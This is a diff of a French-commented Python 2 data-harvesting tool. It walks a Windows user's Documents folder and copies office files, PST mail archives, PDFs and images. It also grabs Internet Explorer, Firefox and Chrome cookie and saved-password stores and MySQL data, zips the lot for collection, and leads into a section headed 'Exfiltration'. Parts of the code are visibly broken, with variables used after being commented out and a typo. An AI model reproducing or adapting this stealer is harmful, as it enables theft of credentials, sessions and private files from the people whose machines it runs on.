@@ -840,243 +840,206 @@ class info_search():
 
     	def parse_all(self):
 		
-        	path_docs = os.getcwd() #Récupération du chemin actuel ou sont stockes les fichiers dumpes
-        	username = getpass.getuser() 
-        	rootDir = 'C:\\' #Racine du chemin analysé pour la recherche
-        
-        	for dirName, subdirList, fileList in os.walk(rootDir):
-			#Ouverture du fichier "Directory_Tree.txt"
-            		fichier = open("Directory_Tree.txt", 'a')
-            		fichier.write('\n %s' % dirName)
-            		fichier.write('\n %s' % subdirList)
-            		fichier.write('\n %s' % fileList)
-            		fichier.write('\n *********************************************************************')                
-            		fichier.close()
+        	path_docs = os.getcwd()                                     #Chemin ou l'on met les fichiers recoltes
+        	if not os.path.exists(os.getcwd()+'\\dataDump'):            #Vérification que le dossier n'existe pas
+		    os.mkdir(os.getcwd()+'\\dataDump')                      #Creation du dossier de récupération
+		dataDump = os.getcwd()+'\\dataDump'                         #Chemin ou sont stockés les fichiers récupérés
+		username = getpass.getuser()                                #Recuperation du nom de l'utilisateur courant
+		#rootDir = 'C:\\'
+		rootDir = 'C:\\Users'+'\\'+''+username+'\\Documents'+'\\'   #Racine à partir de laquelle on lance la recherche d'informations
 
-            	for file in fileList :
+		for dirName, subdirList, fileList in os.walk(rootDir):
+		    fichier = open("Directory_Tree.txt", 'a')               #Ouverture du fichier "Directory_Tree.txt" contenant l'aborescence parcouru
+		    fichier.write('\n %s' % dirName)
+		    fichier.write('\n %s' % subdirList)
+		    fichier.write('\n %s' % fileList)
+		    fichier.write('\n *********************************************************************')                
+		    fichier.close()
 
-                	try:
-                    		filename, extension = file.rsplit('.', 1)
-                   
-                    		if extension == "docx" or extension == "doc":
-                        	#Copie des fichiers trouvees dans la destination qui va bien
-                        		shutil.copy2(dirName+'\\'+file, path_docs)
-                    		if extension == 'xls' or extension =='xlsx' or extension == 'csv':
-                        		#Copie des fichiers trouvees dans la destination qui va bien
-                        		shutil.copy2(dirName+'\\'+file, path_docs)
-                    		if extension == 'ppt' or extension == 'pptx':
-                        		#Copie des fichiers trouvees dans la destination qui va bien
-                        		shutil.copy2(dirName+'\\'+file, path_docs)
-                    		if extension == 'txt':
-                        		#Copie des fichiers trouvees dans la destination qui va bien
-                        		shutil.copy2(dirName+'\\'+file, path_docs)
-                    		if extension == 'pst':
-                        		#Copie des fichiers trouvees dans la destination qui va bien
-                        		shutil.copy2(dirName+'\\'+file, path_docs)
-                    		if extension == 'jpg' or extension == 'png':
-                        		#Copie des fichiers trouvees dans la destination qui va bien
-                        		shutil.copy2(dirName+'\\'+file, path_docs)
-                    		if extension == 'pdf':
-                        		#Copie des fichiers trouvees dans la destination qui va bien
-                        		shutil.copy2(dirName+'\\'+file, path_docs)
-                    		if extension == 'vsd' or extension == 'vsdx':
-                        		#Copie des fichiers trouvees dans la destination qui va bien
-                        		shutil.copy2(dirName+'\\'+file, path_docs)
-                   		if extension == 'zip' or extension == 'rar':
-                       		 	#Copie des fichiers trouvees dans la destination qui va bien
-                       		 	shutil.copy2(dirName+'\\'+file, path_docs)
-                    		elif extension != 'doc' or extension != 'docx' or extension != 'xls' or extension != 'xlsx' or extension != 'csv' or extension != 'ppt' or extension != 'pptx' or extension != 'txt' or extension != 'pst' or extension != 'jpg' or extension != 'png' or extension != 'pdf' or extension != 'vsd' or extension != 'vsdx' or extension != 'zip' or extension != 'rar':
-                        		break
-
-                	except:
-                    		#print("[ERROR] Split error")
-                    		break
+		    for file in fileList :
+			filename, extension = file.rsplit('.', 1)
+			print('filename: '+filename)
+			print('extension: '+extension)
+			try:
+			    if extension == 'txt':
+				shutil.copy2(dirName+'\\'+file, dataDump)
+			    if extension == 'doc'or extension == 'docx':
+				shutil.copy2(dirName+'\\'+file, dataDump)
+			    if extension == 'xls' or extension == 'xlsx' or extension == 'csv':
+				shutil.copy2(dirName+'\\'+file, dataDump)
+			    if extension == 'ppt'or extension == 'pptx':
+				shutil.copy2(dirName+'\\'+file, dataDump)
+			    if extension == 'pst':
+				shutil.copy2(dirName+'\\'+file, dataDump)
+			    if extension == 'jpg':
+				shutil.copy2(dirName+'\\'+file, dataDump)
+			    if extension == 'png':
+				shutil.copy2(dirName+'\\'+file, dataDump)
+			    if extension == 'pdf':
+				shutil.copy2(dirName+'\\'+file, dataDump)   
+			    if extension == 'vsd'or extension == 'vsdx':
+				shutil.copy2(dirName+'\\'+file, dataDump)
+			    if extension == 'zip':
+				shutil.copy2(dirName+'\\'+file, dataDump)
+			    if extension == 'rar':
+				shutil.copy2(dirName+'\\'+file, dataDump)
+			except:
+			    print("[Error] Extension '"+extension+"' non prise en charge")
+		print("[DONE] parse with char")
 
 				
 	def parse_with_char(self):
 
-        	path_docs = os.getcwd() #Récupération du chemin actuel ou sont stockes les fichiers dumpes
-        	username = getpass.getuser() 
-        	rootDir = 'C:\\' #Racine du chemin analysé pour la recherche
+        	path_docs = os.getcwd()
+		if not os.path.exists(os.getcwd()+'\\dataDump'):
+		    os.mkdir(os.getcwd()+'\\dataDump')
+		dataDump = os.getcwd()+'\\dataDump'
+		username = getpass.getuser()
+		#rootDir = 'C:\\'
+		rootDir = 'C:\\Users'+'\\'+''+username+'\\Documents'+'\\'
 
-        	char_choice = glob.glob(str(self.char))
-        	for dirName, subdirList, fileList in os.walk(rootDir):
-           		 #Ouverture du fichier "Directory_Tree.txt"
-            		fichier = open("Directory_Tree.txt", 'a')
-            		fichier.write('\n %s' % dirName)
-            		fichier.write('\n %s' % subdirList)
-            		fichier.write('\n %s' % fileList)
-            		fichier.write('\n *********************************************************************')                
-            		fichier.close()
+		char_choice = glob.glob(str(self.char))
+		for dirName, subdirList, fileList in os.walk(rootDir):
+		    fichier = open("Directory_Tree.txt", 'a')
+		    fichier.write('\n %s' % dirName)
+		    fichier.write('\n %s' % subdirList)
+		    fichier.write('\n %s' % fileList)
+		    fichier.write('\n *********************************************************************')                
+		    fichier.close()
 
-           	for file in fileList : 
-                	filename, extension = file.rsplit('.', 1)
-               		if filename == self.char:
-                    		shutil.copy2(dirName+'\\'+file, path_docs)
+		    for file in fileList : 
+			filename, extension = file.rsplit('.', 1)
+			if filename == self.char:
+			    #print("Copie de "+dirName+ '\\'+file+' vers '+dataDump)
+			    shutil.copy2(dirName+'\\'+file, dataDump)
+		print("[DONE] parse with char")
 
 
-	def parse_with_format(self):  
-        
-        	path_docs = os.getcwd() #Récupération du chemin actuel ou sont stockes les fichiers dumpes
-        	username = getpass.getuser()
-        	rootDir = 'C:\\' #Racine du chemin analysé pour la recherche
+	def parse_with_format(self):
+		
+        	path_docs = os.getcwd()
+		if not os.path.exists(os.getcwd()+'\\dataDump'):
+		    os.mkdir(os.getcwd()+'\\dataDump')
+		dataDump = os.getcwd()+'\\dataDump'
+		username = getpass.getuser()
+		#rootDir = 'C:\\'
+		rootDir = 'C:\\Users'+'\\'+''+username+'\Documents'
 
-        	for dirName, subdirList, fileList in os.walk(rootDir):
-            		#Ouverture du fichier "Directory_Tree.txt"
-            		fichier = open("Directory_Tree.txt", 'a')
-            		fichier.write('\n %s' % dirName)
-            		fichier.write('\n %s' % subdirList)
-            		fichier.write('\n %s' % fileList)
-            		fichier.write('\n *********************************************************************')                
-            		fichier.close()
-           		for file in fileList : 
-              			filename, extension = file.rsplit('.', 1)
-                		if extension == self.format:
-                    			#print("Copie de "+dirName+ '\\'+file+' vers '+path_docs)
-                    			shutil.copy2(dirName+'\\'+file, path_docs)
-
+		for dirName, subdirList, fileList in os.walk(rootDir):
+		    fichier = open("Directory_Tree.txt", 'a')
+		    fichier.write('\n %s' % dirName)
+		    fichier.write('\n %s' % subdirList)
+		    fichier.write('\n %s' % fileList)
+		    fichier.write('\n *********************************************************************')                
+		    fichier.close()
+		    for file in fileList : 
+			filename, extension = file.rsplit('.', 1)
+			if extension == self.format:
+			    #print("Copie de "+dirName+ '\\'+file+' vers '+dataDump)
+			    shutil.copy2(dirName+'\\'+file, dataDump)
+		print("[DONE] parse with format")
 
 	def dump_browser(self):
 
-        	#Chemin ou sont stockes les fichiers dumpes
-        	path_docs = os.getcwd() #Récupération du chemin actuel ou sont stockes les fichiers dumpes
-        	username = getpass.getuser()
+        	path_docs = os.getcwd()
+		if not os.path.exists(os.getcwd()+'\\dataDump'):
+		    os.mkdir(os.getcwd()+'\\dataDump')
+		dataDump = os.getcwd()+'\\dataDump'
+		username = getpass.getuser()
 
+		#IE
+		# path_ie_cookies_a = 'C:\Users' + '\\' + username + '\AppData\Roaming\Microsoft\Windows\Cookies'
+		# path_ie_cookies_b = 'C:\Users' + '\\' + username + '\AppData\Roaming\Microsoft\Windows\Cookies\Low'
+		# path_ie_mdp = 'C:\Users' + '\\' + username + '\Application Data\Microsoft\Credentials'
 
-        #####################
-        ##### WINDOWS XP ####
-        #####################
+		if bool(path_ie_cookies_a) == True:
+		    ie_cookies_a = glob.glob(str(path_ie_cookies_a))
+		    for names in ie_cookies_a:
+			#print (names)
+			shutil.copy2(str(ie_cookies_a), dataDump)
+		if bool(path_ie_cookies_b) == True:
+		    ie_cookies_b = glob.glob(str(path_ie_cookies_b))
+		    shutil.copy2(str(ie_cookies_b), dataDump)        
+		if bool(path_ie_mdp) == True:
+		    ie_mdp = glob.glob(str(path_ie_mdp))
+		    shutil.copy2(str(ie_mdp), dataDump) #Http Authentication Passwords
 
-	    	### IE ####
-		path_ie_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Cookies' 
-        	path_ie_mdp = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Microsoft\Credentials'
-        
-        	#COOKIES
-        	for dirName, subdirList, fileList in os.walk(path_ie_cookies):
-            		for file in fileList :
-                		try:
-                    			shutil.copy2(file, path_docs)
-                		except:
-                    			break
+		#Firefox
+		# path_fi_cookies = 'C:\Users' + '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\npt2xs4d.default\cookies\sqlite'
+		# path_fi_mdp = 'C:\Users' + '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\npt2xs4d.default\key3.db'
 
-        	#MOTS DE PASSES
-        	for dirName, subdirList, fileList in os.walk(path_ie_mdp):
-           		for file in fileList :
-                		try:
-                    			shutil.copy2(file, path_docs)
-                		except:
-                    			break
+		if bool(path_fi_cookies) == True:
+		    fi_cookies = glob.glob(str(path_fi_cookies))
+		    shutil.copy2(str(fi_cookies), dataDump)
+		if bool(path_fi_mdp) == True:
+		    fi_mdp = glob.glob(str(path_fi_mdp))
+		    shutil.copy2(str(fi_mdp), dataDump)
 
-    		#### Firefox ####
+		#Chrome
+		# path_ch_cookies = 'C:\Users' + '\\' + username + '\Application Data\Google\Chrome\UserData\Default\Cache'
+		# path_ch_mdp = 'C:\Users' + '\\' + username + '\Application Data\Google\Chrome\User\Data\Default\Web Data'
 
-        	path_fi_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\ytyz5ohr.default\cookies.sqlite'
-        	path_fi_mdp = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\ytyz5ohr.default\key3.db'
+		if bool(path_ch_cookies) == True:
+		    ch_cookies = glob.glob(str(path_ch_cookies))
+		    shutil.copy2(str(ch_cookies), dataDump)
+		if bool(path_ch_mdp) == True:
+		    ch_mdp = glob.glob(str(path_ch_cookies))
+		    shutil.copy2(str(ch_mdp), dataDump)
 
-        #COOKIES
-        	for dirName, subdirList, fileList in os.walk(path_fi_cookies):
-            		for file in fileList :
-                		try:
-                    			shutil.copy2(file, path_docs)
-                		except:
-                    			break
-
-        #MOTS DE PASSE
-        	for dirName, subdirList, fileList in os.walk(path_fi_mdp):
-           		for file in fileList :
-                		try:
-                    			shutil.copy2(file, path_docs)
-                		except:
-                    			break
-
-    #### Chrome ####
-
-        	path_ch_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Cookies'
-        	path_ch_mdp = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Google\Chrome\User\Data\Default\Web Data'
-
-        #COOKIES
-        	for dirName, subdirList, fileList in os.walk(path_ch_cookies):
-            		for file in fileList :
-                		try:
-                    			shutil.copy2(file, path_docs)
-                		except:
-                   			break
-	
-        #MOTS DE PASSE
-        	for dirName, subdirList, fileList in os.walk(path_ch_mdp):
-            		for file in fileList :
-                		try:
-                    			shutil.copy2(file, path_docs)
-                		except:
-                    			break
 					
-
 	def dump_database(self):
 
-        #MySQL
-        	path_mysql = 'C:\Program Files\MySQL\MySQL Server 5.0\data\mysql'
-        	path_docs = os.getcwd()
-        
-        	if bool(path_mysql) == True:
-            		try:
-                		for dirSQL, subdirSQL, fileSQL in os.walk(path_mysql):
-                    			for i in fileSQL:
-                        		#print(i)
-                        			try:
-                            				shutil.copy2(i, path_docs)
-                        			except:
-                            				print("")
-            		except:
-                		print("")        
+        	#MySQL
+		path_mysql = 'C:\Program Files\MySQL\Data'
+		if not os.path.exists(os.getcwd()+'\\dataDump'):
+		    os.mkdir(os.getcwd()+'\\dataDump')
+		    dataDump = os.getcwd()+'\\dataDump'
+
+		if bool(path_mysql) == True:
+		    data_mysql = glob.glob(str(path_mysql))
+		    shutil.copy2(data_mysql, dataDump)
+ 
 
 	def archivage(self):
 
-        	path_docs = os.getcwd() #Récupération du chemin actuel ou sont stockes les fichiers dumpes
-
-        	#Archivage
-        	fic_all = os.listdir(path_docs)
-        	zfile = zipfile.ZipFile('zipDump.zip','a')
-        	try:
-            		for i in fic_all:
-                		zfile.write(i)
-                		os.remove(i)
-        
-
-        	finally:
-            		zfile.close()
+        	ath_docs = os.getcwd()
+		if not os.path.exists(os.getcwd()+'\\dataDump'):
+		    os.mkdir(os.getcwd()+'\\dataDump')
+		dataDump = os.getcwd()+'\\dataDump'
+		shutil.move(path_docs+'\\'+'Directory_Tree.txt', dataDump)
+		shutil.make_archive('zipDump', 'zip', dataDump)
+		if os.path.exists(os.getcwd()+'\\dataDump'):
+		    shutil.rmtree(os.getcwd()+'\\dataDump')
+		print("[DONE] archivage")
 
 			
 	def main_infosearch(self):
 
         	myinstance = info_search()
-        	if self.all == True and self.char == False and self.format == False:
-            		myinstance.parse_all()
-        	if bool(self.char) == True and self.all == False:
-            		myinstance.parse_with_char()
-        	if bool(self.format) == True and self.all == False:
-            		myinstance.parse_with_format()
-        	if self.hash == True:
-        		myinstance.dump_pass()
-        	elif self.browser == True:
-            		myinstance.dump_browser()
-       	 	elif self.database == True:
-            		myinstance.dump_database()
+		if self.all == True and self.char == False and self.format == False:
+		    myinstance.parse_all()
+		elif bool(self.char) == True and self.all == False:
+		    myinstance.parse_with_char()
+		elif bool(self.format) == True and self.all == False:
+		    myinstance.parse_with_format()
+		elif self.hash == True:
+		    myinstance.dump_pass()
+		elif self.browser == True:
+		    myinstance.dump_browser()
+		elif self.database == True:
+		    myinstance.dump_database()
 
+		if self.all == True or bool(self.char) == True or bool(self.format) == True or self.hash == True or self.browser == True or self.database == True:
+		    try:
+			myinstance.archivage()
+		    except:
+			print("[Error] zip error")
+		if self.all == False and self.char == False and self.format == False and self.hash == False and self.browser == False and self.database == False:
+		    print ("[Error] Add arguments to launch script")
 
-        	elif self.all == False and self.char == False and self.format == False and self.browser == False and self.database == False:
-            		#sys.exit()
-			print "y'asun bug 1"
-            		#and self.hash == False
-
-
-        	if self.all == True or bool(self.char) == True or bool(self.format) == True or self.browser == True or self.database == True:
-            
-            		#and self.hash == True
-
-            		try:
-                		myinstance.archivage()
-            		except:
-                		#sys.exit()
-				print "y'asun bug 2"
+	myinstanceglobal = info_search()
+	myinstanceglobal.main()
+	
 #
 ##Exfiltration
 ###
